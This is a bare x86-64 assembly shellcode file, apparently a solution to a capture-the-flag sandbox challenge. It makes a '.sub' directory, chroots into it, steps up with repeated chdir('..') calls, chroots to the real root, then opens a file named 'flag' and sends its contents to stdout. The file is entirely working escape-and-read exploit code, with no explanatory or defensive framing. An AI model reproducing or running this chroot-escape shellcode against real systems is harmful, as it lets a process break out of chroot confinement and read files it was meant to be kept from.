.text
.global _start
_start:
.intel_syntax noprefix

	/*mkdir*/
	mov rbx, 0x6275732e
	push rbx
	mov rdi, rsp
	mov rsi, 1
	mov rax, 83
	syscall
	pop rbx

	/*chroot new dir*/
	mov rbx, 0x6275732e
	push rbx
	mov rdi, rsp
	mov rax, 161
	syscall
	pop rbx

	/*keep chdir("..")*/
	xor r14, r14
loop:
    mov rbx, 0x2e2e
	push rbx
	mov rdi, rsp
	mov rax, 80
	syscall
	pop rbx
	inc r14
	cmp r14, 1000
	jle loop

	/*chroot(".")*/
	mov rbx, 0x2e
	push rbx
	mov rdi, rsp
	mov rax, 161
	syscall
	pop rbx
 
	/*open flag*/
	mov rbx, 0x67616c66
	push rbx
	/* call open(rsp, NULL) */
	mov rax, 2
	mov rdi, rsp
	mov rsi, 0
	syscall

	/* call sendfile(1, fd, 0, 1000) */
	mov rdi, 0x1
	mov rsi, rax
	mov rdx, 0
	mov r10, 1000
	mov rax, 40
	syscall
